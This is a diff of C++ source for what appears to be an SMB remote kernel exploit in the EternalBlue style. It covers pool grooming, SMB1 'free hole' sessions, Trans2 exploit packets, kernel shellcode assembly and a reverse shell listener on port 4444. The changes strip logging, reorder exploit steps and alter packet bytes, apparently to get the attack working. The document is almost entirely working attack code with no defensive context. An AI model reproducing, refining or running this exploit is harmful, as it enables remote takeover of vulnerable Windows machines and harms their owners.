@@ -449,7 +449,6 @@ public:
     bool Exploit(const std::string& host) {
         if (!shellHandler.StartListener()) {
             std::cout << "[-] FAILED to start reverse shell handler!" << std::endl;
-            std::cout << "[-] Check if port 4444 is already in use or firewall blocking" << std::endl;
             return false;
         }
         
@@ -469,73 +468,60 @@ public:
             auto payload_body_pkt = MakeSMB2PayloadBodyPacket(shellcode);
             
             SOCKET sock = Connect();
+
             if (sock == INVALID_SOCKET) {
-                std::cout << "[-] Connection failed" << std::endl;
                 continue;
             }
             
             if (!SendNegotiate(sock)) { 
-                std::cout << "[-] Negotiate failed" << std::endl;
                 closesocket(sock); 
                 continue; 
             }
         
             if (!DoSessionSetup(sock)) { 
-                std::cout << "[-] Session setup failed" << std::endl;
                 closesocket(sock); 
                 continue; 
             }
         
             if (!SendTreeConnect(sock)) { 
-                std::cout << "[-] Tree connect failed" << std::endl;
                 closesocket(sock); 
                 continue; 
             }
             
             if (!SendNTLargeBuffer(sock)) { 
-                std::cout << "[-] NT Large Buffer failed" << std::endl;
                 closesocket(sock); 
                 continue; 
             }
 
             SOCKET fhs_sock = Smb1FreeHole(true);
             if (fhs_sock == INVALID_SOCKET) { 
-                std::cout << "[-] SMB1 Free Hole start failed" << std::endl;
                 closesocket(sock); 
                 continue; 
             }
-            std::cout << "[+] SMB1 Free Hole start created" << std::endl;
 
             if (!SMB2Grooming(grooms, payload_hdr_pkt)) { 
-                std::cout << "[-] SMB2 Grooming failed" << std::endl;
                 closesocket(fhs_sock); 
                 closesocket(sock); 
                 continue; 
             }
-            std::cout << "[+] SMB2 Grooming successful, " << groomSockets.size() << " sockets created" << std::endl;
+            
+            SOCKET fhf_sock = Smb1FreeHole(false);
+            if (fhf_sock == INVALID_SOCKET) { 
+                closesocket(sock); 
+                continue; 
+            }
 
             closesocket(fhs_sock);
 
             if (!SMB2Grooming(6, payload_hdr_pkt)) { 
-                std::cout << "[-] Additional grooming failed" << std::endl;
                 closesocket(sock); 
                 continue; 
             }
-            std::cout << "[+] Additional grooming successful" << std::endl;
-
-            SOCKET fhf_sock = Smb1FreeHole(false);
-            if (fhf_sock == INVALID_SOCKET) { 
-                std::cout << "[-] SMB1 Free Hole finish failed" << std::endl;
-                closesocket(sock); 
-                continue; 
-            }
-            std::cout << "[+] SMB1 Free Hole finish created" << std::endl;
 
             closesocket(fhf_sock);
 
             auto final_exploit = MakeSMB1Trans2ExploitPacket(ExploitType::TRANS2_EXPLOIT, 15);
             if (!Send(sock, final_exploit.data(), final_exploit.size())) {
-                std::cout << "[-] Final exploit send failed" << std::endl;
                 closesocket(sock);
                 continue;
             }
@@ -701,7 +687,6 @@ private:
         
         sc.insert(sc.end(), kernel_sc, kernel_sc + sizeof(kernel_sc));
         
-        
         sc.push_back((proc_hash >> 0) & 0xFF);
         sc.push_back((proc_hash >> 8) & 0xFF);
         sc.push_back((proc_hash >> 16) & 0xFF);
@@ -834,7 +819,7 @@ private:
         setsockopt(sock, SOL_SOCKET, SO_RCVBUF, (char*)&window_size, sizeof(window_size));
 
         #ifdef TCP_WINDOW_SCALE
-            int window_scale = 7;  // Scale thành 7 như target
+            int window_scale = 7; 
             setsockopt(sock, IPPROTO_TCP, TCP_WINDOW_SCALE, (char*)&window_scale, sizeof(window_scale));
         #else
 
@@ -1113,16 +1098,16 @@ private:
             0x00, 0x00,                             // Reserved2
         });
         
-        // ParameterCount = 4096, ParameterOffset 
-        pkt.insert(pkt.end(), {0x00, 0x10, 0x00, 0x00});
-        // DataCount DataOffset
-        pkt.insert(pkt.end(), {0x00, 0x00, 0x00, 0x00});
-        // DataDisplacement 
-        pkt.insert(pkt.end(), {0x00, 0x00});
-        // SetupCount 
-        pkt.insert(pkt.end(), {0x00});
-        // ByteCount
-        pkt.insert(pkt.end(), {0x00, 0x00});
+        // // ParameterCount = 4096, ParameterOffset 
+        // pkt.insert(pkt.end(), {0x00, 0x10, 0x00, 0x00});
+        // // DataCount DataOffset
+        // pkt.insert(pkt.end(), {0x00, 0x00, 0x00, 0x00});
+        // // DataDisplacement 
+        pkt.insert(pkt.end(), {0x00, 0x10});
+        // // SetupCount 
+        // pkt.insert(pkt.end(), {0x00});
+        // // ByteCount
+        // pkt.insert(pkt.end(), {0x00, 0x00});
         
         std::vector<uint8_t> data_section;
         
@@ -1224,12 +1209,12 @@ private:
             0x00, 0x00, 0x00, 0x00,     // Status
             0x18,                       // Flags
             flags2[0], flags2[1],       // Flags2
-            0x00, 0x00,                 // PID High
+            0xFF, 0xFE,                 // PID High
             0x00, 0x00, 0x00, 0x00,     // Security Features
             0x00, 0x00, 0x00, 0x00,     // Security Features
             0x00, 0x00,                 // Reserved
             0x00, 0x00,                 // TID
-            0xFF, 0xFE,                 // PID  
+            0x00, 0x00,                 // PID  
             0x00, 0x00,                 // UID
             0x40, 0x00                  // MID
         });
@@ -1246,7 +1231,7 @@ private:
             0x00, 0x00, 0x00, 0x00,     // SessionKey
             0x00, 0x00,                 // SecurityBlobLength
             0x00, 0x00, 0x00, 0x00,     // Reserved
-            0x00, 0x00, 0x00, 0x80,     // Capabilities
+            0xd4, 0x00, 0x00, 0x80,     // Capabilities
         });
         
         size_t byte_count_offset = packet.size();
@@ -1285,7 +1270,7 @@ private:
         std::vector<uint8_t> pkt;
         if (start) {
             pkt = MakeSMB1FreeHoleSessionPacket(
-                std::vector<uint8_t>{0x07, 0xC0},  // flags2
+                std::vector<uint8_t>{0x07, 0x40},  // flags2
                 std::vector<uint8_t>{0x2D, 0x01},  // vc_number  
                 std::vector<uint8_t>{0xF0, 0xFF, 0x00, 0x00, 0x00}  // native_os
             );
